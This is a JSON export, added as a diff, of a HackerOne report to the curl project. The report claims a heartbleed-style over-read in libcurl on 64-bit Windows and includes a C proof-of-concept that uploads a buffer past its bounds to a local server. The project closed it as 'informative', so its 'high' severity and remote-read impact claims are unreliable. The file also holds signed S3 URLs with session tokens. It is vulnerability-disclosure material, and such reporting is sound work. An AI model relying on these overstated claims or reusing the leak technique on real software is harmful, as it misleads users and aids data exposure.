@@ -1,0 +1,153 @@
+{
+  "id": 1444539,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNDQ0NTM5",
+  "url": "https://hackerone.com/reports/1444539",
+  "title": " Remote memory disclosure vulnerability in libcurl on 64 Bit Windows",
+  "state": "Closed",
+  "substate": "informative",
+  "severity_rating": "high",
+  "readable_substate": "Informative",
+  "created_at": "2022-01-09T15:24:59.000Z",
+  "submitted_at": "2022-01-09T15:24:59.101Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "nsq11",
+    "url": "/nsq11",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 35663,
+    "url": "https://hackerone.com/curl",
+    "handle": "curl",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "curl",
+      "twitter_handle": "",
+      "website": "https://curl.se",
+      "about": "cURL is an Open Source project providing a library and command-line tool doing internet transfers"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2022-02-21T09:15:57.017Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2022-01-13T22:07:26.643Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "# Remote memory disclosure vulnerability in libcurl on 64 Bit Windows\n\n## Summary:\n\n`libcurl` (latest) contains a vulnerability that enables attackers to\nremotely read memory beyond the bounds of a buffer in the style of the\ninfamous \"heartbleed\" vulnerability. Luckily, however, this is only\npossible when `libcurl` runs on 64 bit Windows and it requires an\nattacker capable of influencing the size of a file upload part.\n\nThe core of the problem is the following: while on 64 Linux and BSD\nsystems, `sizeof(long)` is 8, on 64 bit Windows, it\nis 4. Consequently, the function `AddHttpPost` carries out an integer\ntruncation and sign conversion on these systems, as the parameter\n`bufferlength` of type `size_t` (8 byte wide, unsigned) is assigned to\nthe field `post->bufferlength` of type `long` (4 byte wide,\nsigned). The following excerpt shows the corresponding code:\n\n\n```\nstatic struct curl_httppost *\nAddHttpPost(char *name, size_t namelength,\n            char *value, curl_off_t contentslength,\n            char *buffer, size_t bufferlength,\n\t        [...]\n            struct curl_httppost **last_post)\n{\n\t[...]\n    post->buffer = buffer;\n    post->bufferlength = (long)bufferlength; /* <=== */ \n\t[...]\n}\n```\n\nIn particular, this function is triggered when constructing an HTTP\nPOST request that specifies custom file upload parts, e.g., with a\nstatement such as the following:\n\n```\ncurl_formadd(&formpost,\n             &lastptr,\n             CURLFORM_COPYNAME, \"name\",\n             CURLFORM_BUFFER, \"data\",\n             CURLFORM_BUFFERPTR, buffer,\n             CURLFORM_BUFFERLENGTH, size,\n             CURLFORM_END);\n```\n\nAn attacker capable of choosing the file to upload may choose for it\nto be 4294967295 in size, and, indeed, `libcurl` will transfer this\nfile without trouble on 64 bit Linux. On 64 bit Windows, however, this\nleads to `post->bufferlength` being -1 due to the\ntruncation/sign-conversion, which happens to also be the value of the\nconstant `CURL_ZERO_TERMINATED`. On posting the data, this undesirable\ninterpretation causes the function `curl_mime_data` to assume that the\nlength of the buffer to upload is not known and should be determined\nvia `strlen`. Assuming the buffer does not contain zero bytes - and in\nfact, the documentation states that it MAY NOT contain zero bytes,\n`strlen` will read beyond the bounds of the buffer `buffer`, and\nsubsequently transmit the buffer contents AND memory behind it to the\nHTTP server.\n\nThe following (commented) excerpt of `curl_mime_data` illustrates this\nbehavior:\n\n```\nCURLcode curl_mime_data(curl_mimepart *part, /* <=== */ \n                        const char *data, size_t datasize)\n{\n   [...]\n\n  if(data) {\n    // This branch is triggered when `datasize` is -1,\n\t// Note that `datasize` is again `size_t`, so, it will\n\t// then be > 2**32-1.\n    if(datasize == CURL_ZERO_TERMINATED)\n      datasize = strlen(data);\n\n\t// With a system that has > 4GB RAM, this allocation\n\t// succeeds.\n    part->data = malloc(datasize + 1);\n    if(!part->data)\n      return CURLE_OUT_OF_MEMORY;\n\n\t// The part size is now set to be larger than 2**32-1,\n\t// although 2**32-1 is the size of the file. \n    part->datasize = datasize;\n\n```\n\n## Steps To Reproduce:\n\nTo further illustrate the problem, I have created a sample application\nfor which the string \"secret\" is located directly after the\nto-be-transmitted buffer. On 64 bit Linux, the program correctly\ntransmits only the contents of the buffer. On 64 bit Windows, it\ntransmits the buffer contents and the string \"secret\". Logging network\ntraffic using `tcpdump`, this has been confirmed as the attached\nscreenshots show.\n\nThe following is the sample program (test.c), which compiles both on Linux\nand Windows (Visual Studio 2022 Community Edition).\n\n```\n#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\n#include <curl/curl.h>\n\nint main(void)\n{\n    CURL* curl;\n    CURLM* multi_handle;\n    int still_running = 0;\n    struct curl_httppost* formpost = NULL;\n    struct curl_httppost* lastptr = NULL;\n    struct curl_slist* headerlist = NULL;\n    static const char buf[] = \"Expect:\";\n\n    // Place 4294967295 'A's on the heap (the buffer to transmit),\n    // followed by the string \"secret\". If we now instruct libcurl\n    // to transfer 4294967295, it should only transfer 'A's.\n    \n    size_t size = (size_t) 0xffffffff;\n    char* buffer = (char*)malloc(size + strlen(\"secret\") + 1);    \n    memset(buffer, 'A', size);    \n    memcpy(buffer + size, \"secret\", strlen(\"secret\"));\n    buffer[size + strlen(\"secret\")] = '\\0';\n\n    // Instruct curl to send the buffer, specifying its size\n    // to be 4294967295 (size)\n    \n    int ret = curl_formadd(&formpost,\n        &lastptr,\n        CURLFORM_COPYNAME, \"name\",\n        CURLFORM_BUFFER, \"data\",\n        CURLFORM_BUFFERPTR, buffer,\n        CURLFORM_BUFFERLENGTH, size,\n        CURLFORM_END);\n\n    // The return value is 0 (success)\n    printf(\"%d\\n\", ret);\n    \n    curl = curl_easy_init();\n    multi_handle = curl_multi_init();    \n    headerlist = curl_slist_append(headerlist, buf);\n    if (curl && multi_handle) {\n      // We are uploading to a local webserver, but this can be any webserver.\n      // upload.cgi can be an empty file.\n      curl_easy_setopt(curl, CURLOPT_URL, \"http://192.168.1.216/upload.cgi\");\n      curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);\n      curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headerlist);\n      curl_easy_setopt(curl, CURLOPT_HTTPPOST, formpost);      \n      curl_multi_add_handle(multi_handle, curl);      \n      do {\n            CURLMcode mc = curl_multi_perform(multi_handle, &still_running);\t    \n            if (still_running)\n\t      /* wait for activity, timeout or \"nothing\" */\n\t      mc = curl_multi_poll(multi_handle, NULL, 0, 1000, NULL);\t    \n            if (mc)\n\t      break;\t    \n      } while (still_running);      \n      curl_multi_cleanup(multi_handle);\n      curl_easy_cleanup(curl);\n      curl_formfree(formpost);\n      curl_slist_free_all(headerlist);\n    }\n    return 0;\n}\n```\n\nAs suggested patch would be to use the type `long long` as opposed to\n`long` for the buffer length. `long long` is guaranteed to be 8 byte\nwide on Linux and Windows 64 bit systems.\n\n## Impact\n\nAn attacker could read memory from the process remotely, meaning that any information processed by the program using libcurl may be disclosed. Depending on the application, this information may be sensitive, e.g., passwords, keys could be in memory. In addition, reading memory offsets may be useful to identify memory mappings remotely in preparation for a memory corruption exploits that requires bypassing of ASLR.",
+  "weakness": {
+    "id": 113,
+    "name": "Information Exposure Through Sent Data"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 1573103,
+      "file_name": "screenshot-linux.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/dl88uqdo51ruemqmgyt8m7zap2ik?response-content-disposition=attachment%3B%20filename%3D%22screenshot-linux.png%22%3B%20filename%2A%3DUTF-8%27%27screenshot-linux.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQRMGWVS55%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T151236Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB4aCXVzLXdlc3QtMiJIMEYCIQD3al1rCJ3O%2Fkny4kQOGMoXRH2Qxl4uMP0zQ2vU83jeqAIhAKDL9A0s99ztEWDQrYgS49Ou5Pwuhq4QbJi7YGiGAaqPKroFCOf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igzlgj0MJ1WocQDQscgqjgV5Kwh2KzHqCqa4vhfEP3AS8Tml2wtA9WE2CJX0TDTLkrLFwGtDJC2eqOfEl6doD0P04s51sUhQ1NPV%2FRZyG2JIcB18vxqpyztA%2FE4wiXOoJ99RPRZz7UhNbauwlCxx7dkmrG7BgjtNjtJBhglpoQy1HLkioY66%2Blmx3mHUUDtC0j2kDl4%2FzKfPNoFYMdyI1ZNE%2BXU39qvdV7bIQY9DcH%2FLBEKIWjnXe0qlpcNjx6DPX%2FcwyJcyxS%2BerWO9p7CtSDHrDfmQvyguv3zXT3d6DniJTbPq2XlRv2aA7U0QEvVhC%2B52zN%2BCT1wc%2FTXd2zaD9rdewBREhk%2FrD330jt%2FMTWGE%2Fi%2FWrZgsY2BP1iVIrHVPWgzcD%2BrPp%2Fyb872R%2FInqHTsOzQUZ8N33Jj9r%2F36plgfxlPQBKDbULsXrUJd2m2I6HwMCpIbTrKJ8ZtPkRtuddc2FGDJM7KvWCavoo8mzR9gTmBiUND4RpKUf9V66NWm82FpF8RoK8qf7TEDbJ0F%2F1Bv4O6tX%2FpDbzw9Pm4ta2YirDgEWYWWZZwHAqZYNxuRxeSmURqqcLYVxS5vYVhG0eISbKK2ak2D00aVO8FlRlRvlUa66zuo3GKfTf1WgLgDhoFPtXj2w0Yp7GlpT7wgUl6ykumJNaXKlPDK5qUy3IxEh%2FRlcM7%2BgmOFmc%2BjWsawwP8AmtBmYedmh2nPu%2FmEh98dJ%2FtLHCWn1TUT4sM6T7z48LxorxOuK%2F3mdJwjiPg1YxbRAcPWIz3nqLDzWSCuQegRGiZkKV4DrJbyEf%2B9rlLzUWhwI2VwTiMR%2Bxp9RbpJUoIJPfO6SA2vBm1UpThel5qHHNI7qtpu5NI1kCg0bM7vhjnUAdl%2FCCL%2FbQAsPsQEwrv38zwY6sAEQlTMdfqTdh0VN7kX6x61r4E2uz1moz52eVTrKC1k7WWCj5eq7fzhGWVEO97QnaKNUCHuLuwFbFRrO3EFzOgEhQ%2Baj2H3N5XIn6UhkNVqdTZcY3Oc0Of7dqir6coEUhpGguzqGBT5XWaZBhzJdLFaGnImiPXkGyNYP15TwA6VP0kks6VBF88%2FDhPh9c%2B8691wmizrPsx9OnxVRnI0WgAFIG%2BcYP%2BzM8osbAZ6cm55GvA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=ab966a9551c927807128a130be0160cd26d15998cc739cba38f50a361bfe0e00",
+      "file_size": 22734,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 1573104,
+      "file_name": "screenshot-win.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/a1vkczon7u5l6wwnutba02bj2yox?response-content-disposition=attachment%3B%20filename%3D%22screenshot-win.png%22%3B%20filename%2A%3DUTF-8%27%27screenshot-win.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQRMGWVS55%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T151236Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB4aCXVzLXdlc3QtMiJIMEYCIQD3al1rCJ3O%2Fkny4kQOGMoXRH2Qxl4uMP0zQ2vU83jeqAIhAKDL9A0s99ztEWDQrYgS49Ou5Pwuhq4QbJi7YGiGAaqPKroFCOf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igzlgj0MJ1WocQDQscgqjgV5Kwh2KzHqCqa4vhfEP3AS8Tml2wtA9WE2CJX0TDTLkrLFwGtDJC2eqOfEl6doD0P04s51sUhQ1NPV%2FRZyG2JIcB18vxqpyztA%2FE4wiXOoJ99RPRZz7UhNbauwlCxx7dkmrG7BgjtNjtJBhglpoQy1HLkioY66%2Blmx3mHUUDtC0j2kDl4%2FzKfPNoFYMdyI1ZNE%2BXU39qvdV7bIQY9DcH%2FLBEKIWjnXe0qlpcNjx6DPX%2FcwyJcyxS%2BerWO9p7CtSDHrDfmQvyguv3zXT3d6DniJTbPq2XlRv2aA7U0QEvVhC%2B52zN%2BCT1wc%2FTXd2zaD9rdewBREhk%2FrD330jt%2FMTWGE%2Fi%2FWrZgsY2BP1iVIrHVPWgzcD%2BrPp%2Fyb872R%2FInqHTsOzQUZ8N33Jj9r%2F36plgfxlPQBKDbULsXrUJd2m2I6HwMCpIbTrKJ8ZtPkRtuddc2FGDJM7KvWCavoo8mzR9gTmBiUND4RpKUf9V66NWm82FpF8RoK8qf7TEDbJ0F%2F1Bv4O6tX%2FpDbzw9Pm4ta2YirDgEWYWWZZwHAqZYNxuRxeSmURqqcLYVxS5vYVhG0eISbKK2ak2D00aVO8FlRlRvlUa66zuo3GKfTf1WgLgDhoFPtXj2w0Yp7GlpT7wgUl6ykumJNaXKlPDK5qUy3IxEh%2FRlcM7%2BgmOFmc%2BjWsawwP8AmtBmYedmh2nPu%2FmEh98dJ%2FtLHCWn1TUT4sM6T7z48LxorxOuK%2F3mdJwjiPg1YxbRAcPWIz3nqLDzWSCuQegRGiZkKV4DrJbyEf%2B9rlLzUWhwI2VwTiMR%2Bxp9RbpJUoIJPfO6SA2vBm1UpThel5qHHNI7qtpu5NI1kCg0bM7vhjnUAdl%2FCCL%2FbQAsPsQEwrv38zwY6sAEQlTMdfqTdh0VN7kX6x61r4E2uz1moz52eVTrKC1k7WWCj5eq7fzhGWVEO97QnaKNUCHuLuwFbFRrO3EFzOgEhQ%2Baj2H3N5XIn6UhkNVqdTZcY3Oc0Of7dqir6coEUhpGguzqGBT5XWaZBhzJdLFaGnImiPXkGyNYP15TwA6VP0kks6VBF88%2FDhPh9c%2B8691wmizrPsx9OnxVRnI0WgAFIG%2BcYP%2BzM8osbAZ6cm55GvA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=7b42d42c21e64b6fde52f15a2d35b706f787aed8c6bacc35b4296a75109bc8f2",
+      "file_size": 23707,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 1573105,
+      "file_name": "test.c",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/8qr3yahxdhyk1750pcnqr3r4hpdc?response-content-disposition=attachment%3B%20filename%3D%22test.c%22%3B%20filename%2A%3DUTF-8%27%27test.c&response-content-type=text%2Fx-csrc&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQRMGWVS55%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T151236Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB4aCXVzLXdlc3QtMiJIMEYCIQD3al1rCJ3O%2Fkny4kQOGMoXRH2Qxl4uMP0zQ2vU83jeqAIhAKDL9A0s99ztEWDQrYgS49Ou5Pwuhq4QbJi7YGiGAaqPKroFCOf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igzlgj0MJ1WocQDQscgqjgV5Kwh2KzHqCqa4vhfEP3AS8Tml2wtA9WE2CJX0TDTLkrLFwGtDJC2eqOfEl6doD0P04s51sUhQ1NPV%2FRZyG2JIcB18vxqpyztA%2FE4wiXOoJ99RPRZz7UhNbauwlCxx7dkmrG7BgjtNjtJBhglpoQy1HLkioY66%2Blmx3mHUUDtC0j2kDl4%2FzKfPNoFYMdyI1ZNE%2BXU39qvdV7bIQY9DcH%2FLBEKIWjnXe0qlpcNjx6DPX%2FcwyJcyxS%2BerWO9p7CtSDHrDfmQvyguv3zXT3d6DniJTbPq2XlRv2aA7U0QEvVhC%2B52zN%2BCT1wc%2FTXd2zaD9rdewBREhk%2FrD330jt%2FMTWGE%2Fi%2FWrZgsY2BP1iVIrHVPWgzcD%2BrPp%2Fyb872R%2FInqHTsOzQUZ8N33Jj9r%2F36plgfxlPQBKDbULsXrUJd2m2I6HwMCpIbTrKJ8ZtPkRtuddc2FGDJM7KvWCavoo8mzR9gTmBiUND4RpKUf9V66NWm82FpF8RoK8qf7TEDbJ0F%2F1Bv4O6tX%2FpDbzw9Pm4ta2YirDgEWYWWZZwHAqZYNxuRxeSmURqqcLYVxS5vYVhG0eISbKK2ak2D00aVO8FlRlRvlUa66zuo3GKfTf1WgLgDhoFPtXj2w0Yp7GlpT7wgUl6ykumJNaXKlPDK5qUy3IxEh%2FRlcM7%2BgmOFmc%2BjWsawwP8AmtBmYedmh2nPu%2FmEh98dJ%2FtLHCWn1TUT4sM6T7z48LxorxOuK%2F3mdJwjiPg1YxbRAcPWIz3nqLDzWSCuQegRGiZkKV4DrJbyEf%2B9rlLzUWhwI2VwTiMR%2Bxp9RbpJUoIJPfO6SA2vBm1UpThel5qHHNI7qtpu5NI1kCg0bM7vhjnUAdl%2FCCL%2FbQAsPsQEwrv38zwY6sAEQlTMdfqTdh0VN7kX6x61r4E2uz1moz52eVTrKC1k7WWCj5eq7fzhGWVEO97QnaKNUCHuLuwFbFRrO3EFzOgEhQ%2Baj2H3N5XIn6UhkNVqdTZcY3Oc0Of7dqir6coEUhpGguzqGBT5XWaZBhzJdLFaGnImiPXkGyNYP15TwA6VP0kks6VBF88%2FDhPh9c%2B8691wmizrPsx9OnxVRnI0WgAFIG%2BcYP%2BzM8osbAZ6cm55GvA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=7b3f670dd88c6cb4683af6ab689aa7935924293d6b085a3ee256bf04e7f8d991",
+      "file_size": 2237,
+      "type": "text/x-csrc",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 5,
+  "voters": [
+    "at0mq1",
+    "h4x0r_dz",
+    "ibring",
+    "palakmahipal",
+    "khizer47"
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 7.7,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "low",
+      "user_interaction": "none",
+      "scope": "changed",
+      "confidentiality": "high",
+      "integrity": "none",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 18844,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/curl/curl",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
